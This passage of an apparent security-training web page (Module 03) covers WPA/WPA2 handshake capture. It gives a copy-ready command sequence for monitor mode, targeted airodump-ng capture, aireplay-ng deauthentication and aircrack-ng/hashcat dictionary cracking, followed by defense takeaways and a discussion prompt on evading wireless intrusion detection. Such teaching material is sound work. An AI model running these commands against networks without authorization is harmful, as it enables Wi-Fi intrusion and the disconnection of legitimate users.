+<span class="comment"># Pane 1 (left): airodump-ng targeted capture</span>
+$ sudo airodump-ng <span class="flag">-c</span> <span class="str">6</span> <span class="flag">--bssid</span> <span class="str">AA:BB:CC:DD:EE:FF</span> <span class="flag">-w</span> <span class="str">capture</span> wlan0mon
+
+<span class="comment"># Switch to pane 2: Ctrl+B then arrow key</span>
+<span class="comment"># Pane 2 (right): wait until airodump shows client, then deauth</span>
+$ sudo aireplay-ng <span class="flag">-0</span> <span class="str">5</span> <span class="flag">-a</span> <span class="str">AA:BB:CC:DD:EE:FF</span> <span class="flag">-c</span> <span class="str">11:22:33:44:55:66</span> wlan0mon
+                    </div>
+                </div>
+            </div>
+
+            <div class="detail-section">
+                <div class="detail-header" onclick="toggleDetail(this)">
+                    <div class="detail-header-left">
+                        <span class="detail-header-icon">&#128300;</span>
+                        <div>
+                            <div class="detail-header-title">Full Step-by-Step Command Sequence</div>
+                            <div class="detail-header-subtitle">Copy-ready procedure from monitor mode to verified capture</div>
+                        </div>
+                    </div>
+                    <span class="detail-toggle">&#9660;</span>
+                </div>
+                <div class="detail-body">
+                    <div class="code-block">
+<span class="comment">##################################################</span>
+<span class="comment"># PHASE 1: Adapter Preparation</span>
+<span class="comment">##################################################</span>
+
+<span class="comment"># Kill processes that interfere with monitor mode</span>
+$ sudo airmon-ng check kill
+
+<span class="comment"># Enable monitor mode on wlan0</span>
+$ sudo airmon-ng start wlan0
+<span class="comment"># Adapter now listed as wlan0mon (verify with: iwconfig)</span>
+
+<span class="comment">##################################################</span>
+<span class="comment"># PHASE 2: Target Discovery</span>
+<span class="comment">##################################################</span>
+
+<span class="comment"># Scan all channels to identify targets</span>
+<span class="comment"># Note: target BSSID (e.g. AA:BB:CC:DD:EE:FF) and CH (e.g. 6)</span>
+$ sudo airodump-ng wlan0mon
+<span class="comment"># Ctrl+C when target identified</span>
+
+<span class="comment">##################################################</span>
+<span class="comment"># PHASE 3: Targeted Capture (run in pane 1)</span>
+<span class="comment">##################################################</span>
+
+$ sudo airodump-ng \
+  <span class="flag">-c</span> <span class="str">6</span> \
+  <span class="flag">--bssid</span> <span class="str">AA:BB:CC:DD:EE:FF</span> \
+  <span class="flag">-w</span> <span class="str">target_capture</span> \
+  wlan0mon
+<span class="comment"># Leave this running. Watch for "WPA handshake:" in top-right.</span>
+<span class="comment"># Note a STATION MAC from the lower section of the output.</span>
+
+<span class="comment">##################################################</span>
+<span class="comment"># PHASE 4: Deauthentication (run in pane 2)</span>
+<span class="comment">##################################################</span>
+
+<span class="comment"># Targeted deauth against a specific client</span>
+$ sudo aireplay-ng \
+  <span class="flag">-0</span> <span class="str">5</span> \
+  <span class="flag">-a</span> <span class="str">AA:BB:CC:DD:EE:FF</span> \
+  <span class="flag">-c</span> <span class="str">11:22:33:44:55:66</span> \
+  wlan0mon
+
+<span class="comment"># Wait 5-10 seconds after deauth completes.</span>
+<span class="comment"># Confirm "WPA handshake: AA:BB:CC:DD:EE:FF" appears in pane 1.</span>
+<span class="comment"># Stop airodump-ng with Ctrl+C.</span>
+
+<span class="comment">##################################################</span>
+<span class="comment"># PHASE 5: Verification and Cracking</span>
+<span class="comment">##################################################</span>
+
+<span class="comment"># Verify handshake is present in capture</span>
+$ aircrack-ng target_capture-01.cap
+
+<span class="comment"># Convert to hashcat format for GPU cracking</span>
+$ hcxpcapngtool <span class="flag">-o</span> hashes.hc22000 target_capture-01.cap
+
+<span class="comment"># Run dictionary attack (CPU)</span>
+$ aircrack-ng \
+  <span class="flag">-w</span> <span class="str">/usr/share/wordlists/rockyou.txt</span> \
+  <span class="flag">-b</span> <span class="str">AA:BB:CC:DD:EE:FF</span> \
+  target_capture-01.cap
+
+<span class="comment"># Run dictionary attack (GPU — much faster)</span>
+$ hashcat \
+  <span class="flag">-m</span> 22000 \
+  <span class="flag">-a</span> 0 \
+  hashes.hc22000 \
+  /usr/share/wordlists/rockyou.txt \
+  <span class="flag">--status</span> <span class="flag">--status-timer</span> <span class="str">30</span>
+
+<span class="comment"># Restore managed mode when finished</span>
+$ sudo airmon-ng stop wlan0mon
+$ sudo systemctl start NetworkManager
+                    </div>
+                </div>
+            </div>
+
+            <div class="callout callout-tip">
+                <span class="callout-icon">&#10003;</span>
+                <div class="callout-content">
+                    <div class="callout-title">Operational Security Notes for Assessments</div>
+                    <div class="callout-text">
+                        On authorized engagements: document the target BSSID, the client MAC deauthenticated,
+                        the timestamp of capture, and the capture file hash (sha256) before proceeding to
+                        cracking. This chain-of-custody documentation proves you only targeted the authorized
+                        network and provides artifact evidence for the final report. Never store captured
+                        handshake files on a system connected to the client's production network.
+                    </div>
+                </div>
+            </div>
+
+            <!-- Tool summary table -->
+            <div style="margin-top: 30px;">
+                <div style="font-size: 0.7rem; color: #6a4a7a; letter-spacing: 0.3em; text-transform: uppercase; margin-bottom: 14px;">Tool Responsibilities Summary</div>
+                <table class="standards-table">
+                    <thead>
+                        <tr>
+                            <th>Tool</th>
+                            <th>Phase</th>
+                            <th>Primary Function</th>
+                            <th>Key Flags</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td class="std-name">airmon-ng</td>
+                            <td>Preparation</td>
+                            <td>Enable/disable monitor mode; kill interfering processes</td>
+                            <td><code style="color:#fbbf24; font-size:0.82rem;">start wlan0</code>, <code style="color:#fbbf24; font-size:0.82rem;">check kill</code></td>
+                        </tr>
+                        <tr>
+                            <td class="std-name">airodump-ng</td>
+                            <td>Discovery + Capture</td>
+                            <td>Enumerate APs and clients; write 802.11 frames to .cap file</td>
+                            <td><code style="color:#fbbf24; font-size:0.82rem;">-c</code>, <code style="color:#fbbf24; font-size:0.82rem;">--bssid</code>, <code style="color:#fbbf24; font-size:0.82rem;">-w</code></td>
+                        </tr>
+                        <tr>
+                            <td class="std-name">aireplay-ng</td>
+                            <td>Injection</td>
+                            <td>Send deauthentication frames to force client reconnection</td>
+                            <td><code style="color:#fbbf24; font-size:0.82rem;">-0</code>, <code style="color:#fbbf24; font-size:0.82rem;">-a</code>, <code style="color:#fbbf24; font-size:0.82rem;">-c</code></td>
+                        </tr>
+                        <tr>
+                            <td class="std-name">aircrack-ng</td>
+                            <td>Verification + Cracking</td>
+                            <td>Verify handshake presence; CPU-based dictionary attack</td>
+                            <td><code style="color:#fbbf24; font-size:0.82rem;">-w</code>, <code style="color:#fbbf24; font-size:0.82rem;">-b</code></td>
+                        </tr>
+                        <tr>
+                            <td class="std-name">hcxdumptool</td>
+                            <td>PMKID Capture</td>
+                            <td>Capture PMKID from AP RSN IE without client present</td>
+                            <td><code style="color:#fbbf24; font-size:0.82rem;">-o</code>, <code style="color:#fbbf24; font-size:0.82rem;">-i</code>, <code style="color:#fbbf24; font-size:0.82rem;">--filterlist_ap</code></td>
+                        </tr>
+                        <tr>
+                            <td class="std-name">hcxpcapngtool</td>
+                            <td>Conversion</td>
+                            <td>Convert .cap/.pcapng to hashcat 22000 format</td>
+                            <td><code style="color:#fbbf24; font-size:0.82rem;">-o</code></td>
+                        </tr>
+                        <tr>
+                            <td class="std-name">hashcat</td>
+                            <td>Cracking</td>
+                            <td>GPU-accelerated dictionary and rule-based PSK recovery</td>
+                            <td><code style="color:#fbbf24; font-size:0.82rem;">-m 22000</code>, <code style="color:#fbbf24; font-size:0.82rem;">-a 0</code>, <code style="color:#fbbf24; font-size:0.82rem;">-r</code></td>
+                        </tr>
+                        <tr>
+                            <td class="std-name">wireshark</td>
+                            <td>Deep Verification</td>
+                            <td>Inspect EAPOL message sequence and MIC field integrity</td>
+                            <td>Filter: <code style="color:#86efac; font-size:0.82rem;">eapol</code></td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+
+    <!-- Key Takeaways -->
+    <div class="section" id="s7">
+        <div class="section-number">Section 07</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#9889;</span>
+            Key Takeaways
+        </h2>
+        <div class="section-body">
+            <div class="takeaway-grid">
+                <div class="takeaway-card">
+                    <div class="takeaway-icon">&#128221;</div>
+                    <div class="takeaway-title">The Handshake Is the Secret</div>
+                    <div class="takeaway-desc">Capturing the EAPOL exchange moves the attack offline. Once captured, the PSK can be guessed at GPU rates with no network interaction and no detectable activity against the target.</div>
+                </div>
+                <div class="takeaway-card">
+                    <div class="takeaway-icon">&#9889;</div>
+                    <div class="takeaway-title">PMKID First, Deauth Second</div>
+                    <div class="takeaway-desc">The 2018 PMKID attack eliminated the need for connected clients. Always attempt PMKID capture first — it is faster, quieter, and deterministic. Reserve deauthentication for networks where PMKID is unavailable.</div>
+                </div>
+                <div class="takeaway-card">
+                    <div class="takeaway-icon">&#128272;</div>
+                    <div class="takeaway-title">Password Quality Is the Sole Defense</div>
+                    <div class="takeaway-desc">Against WPA2-Personal, the PSK is the only secret. A 20+ character random passphrase is computationally infeasible to crack. Dictionary words, names, and short passphrases are recoverable in minutes to hours.</div>
+                </div>
+                <div class="takeaway-card">
+                    <div class="takeaway-icon">&#128737;</div>
+                    <div class="takeaway-title">PMF Blocks Deauth; WPA3 Blocks Both</div>
+                    <div class="takeaway-desc">Protected Management Frames prevent deauthentication injection. WPA3 with SAE eliminates offline cracking entirely. The migration path is clear: WPA3 + long random passphrase + 802.1X for enterprise.</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Discussion -->
+    <div class="section" id="discuss">
+        <div class="discussion-section">
+            <div class="discussion-title">
+                <span>&#128172;</span>
+                Discussion Prompts
+            </div>
+            <ul class="prompt-list">
+                <li class="prompt-item">
+                    <span class="prompt-num">01</span>
+                    The PMKID attack (2018) eliminated the need for a connected client, fundamentally changing WPA2 attack logistics. How does this discovery affect wireless security risk assessments for organizations that previously considered "low client activity" networks to be lower-risk targets? What does the PMKID finding suggest about the security properties that protocol designers should consider when adding convenience features to cryptographic protocols?
+                </li>
+                <li class="prompt-item">
+                    <span class="prompt-num">02</span>
+                    Deauthentication attacks are detectable by WIDS. Design a more stealthy approach to capturing handshakes that minimizes detection risk during a penetration test. Consider passive waiting strategies, timing windows (e.g., shift changes, morning boot cycles), and signal positioning. What is the operational tradeoff between stealth and speed when a client engagement has a limited time window?
+                </li>
+                <li class="prompt-item">
+                    <span class="prompt-num">03</span>
+                    WPA3's mandatory PMF prevents deauthentication-based handshake capture, and SAE replaces the PSK exchange with a mechanism that requires online brute-force (rate-limitable at the AP). With WPA3-Personal fully deployed, what alternative approaches remain for wireless assessments? Consider side-channels, implementation vulnerabilities, client configuration weaknesses, and the transition period where WPA2/WPA3 mixed-mode operation is common.
+                </li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- Completion -->
+    <div class="section" id="completion">
+        <div class="completion-section">
+            <div class="completion-icon">&#10003;</div>
+            <h2 class="completion-title">Module Complete</h2>
+            <p class="completion-text">
+                You have examined the full WPA/WPA2 4-way handshake protocol, the EAPOL message sequence
+                that enables offline cracking, the 2018 PMKID discovery that eliminated the client
+                requirement, targeted airodump-ng capture workflows, deauthentication injection with
+                aireplay-ng, handshake verification using aircrack-ng and Wireshark, and the complete
+                end-to-end attack flow from monitor mode to GPU-accelerated cracking.
+            </p>
+            <button class="completion-btn" onclick="completeModule()">
+                <span>&#10003;</span>
+                Complete Module 03
+            </button>
+        </div>
+    </div>
+
+</main>
+
+<script>
+    // Scroll progress bar — updates both the top bar and the header mini-bar
+    function updateScrollProgress() {
+        const scrollTop = window.scrollY;
+        const docHeight = document.documentElement.scrollHeight - window.innerHeight;
+        const pct = docHeight > 0 ? (scrollTop / docHeight) * 100 : 0;
+        document.getElementById('scrollProgress').style.width = pct + '%';
+        document.getElementById('readingFill').style.width = pct + '%';
+    }
+
+    window.addEventListener('scroll', updateScrollProgress, { passive: true });
+
+    // Section fade-in via IntersectionObserver
+    function initScrollAnimation() {
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) entry.target.classList.add('visible');
+            });
+        }, { threshold: 0.08 });
+
+        document.querySelectorAll('.section').forEach(s => observer.observe(s));
+    }
+
+    // Expandable detail sections — toggle open/closed state
+    function toggleDetail(header) {
+        const body = header.nextElementSibling;
+        const toggle = header.querySelector('.detail-toggle');
+        const isOpen = body.classList.contains('open');
+        body.classList.toggle('open', !isOpen);
+        toggle.classList.toggle('open', !isOpen);
+    }
+
+    // Module completion — delegates to ModuleProgress component
+    function completeModule() {
+        if (typeof ModuleProgress !== 'undefined') {
+            ModuleProgress.complete('dark-arts', 'wifi-mod-handshake', {
+                returnUrl: '../index.html'
+            });
+        }
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+        initScrollAnimation();
+    });
+</script>
+
+</body>
+</html>
